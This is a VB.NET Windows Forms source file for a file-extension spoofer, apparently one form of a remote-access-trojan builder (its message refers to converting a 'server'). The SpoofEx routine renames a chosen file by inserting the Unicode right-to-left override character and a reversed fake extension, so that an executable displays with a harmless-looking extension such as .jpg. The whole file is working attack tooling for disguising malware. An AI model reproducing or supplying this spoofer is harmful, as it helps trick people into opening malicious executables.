Public Class Form4
    Dim OpenFileDialog As New OpenFileDialog
    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        My.Computer.Audio.Play(My.Resources.click_one, AudioPlayMode.Background)
        Me.Close()
    End Sub

    Private Sub LogInButton1_Click(sender As Object, e As EventArgs) Handles LogInButton1.Click
        My.Computer.Audio.Play(My.Resources.click_one, AudioPlayMode.Background)
        With OpenFileDialog
            .Title = "Choose file ..."
            .Filter = "All Files (*.*)|*.*"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                TextBox1.Text = OpenFileDialog.FileName
            End If
        End With
    End Sub

    Private Sub LogInButton2_Click(sender As Object, e As EventArgs) Handles LogInButton2.Click
        My.Computer.Audio.Play(My.Resources.click_one, AudioPlayMode.Background)
        SpoofEx(OpenFileDialog.FileName, ComboBox1.Text)
        MsgBox(" Your Server Convert  Successfully", MsgBoxStyle.Information, "Convert ")
        Me.Close()
    End Sub

    Public Sub SpoofEx(ByVal File_Sp As String, ByVal Extension As String)
        My.Computer.Audio.Play(My.Resources.click_one, AudioPlayMode.Background)
        Dim array As Char() = Extension.ToCharArray
        System.Array.Reverse(array)
        Dim destFileName As String = (File_Sp.Substring(0, (File_Sp.Length - 4)) & ChrW(8238) & New String(array) & File_Sp.Substring((File_Sp.Length - 4)))
        IO.File.Move(File_Sp, destFileName)
    End Sub
End Class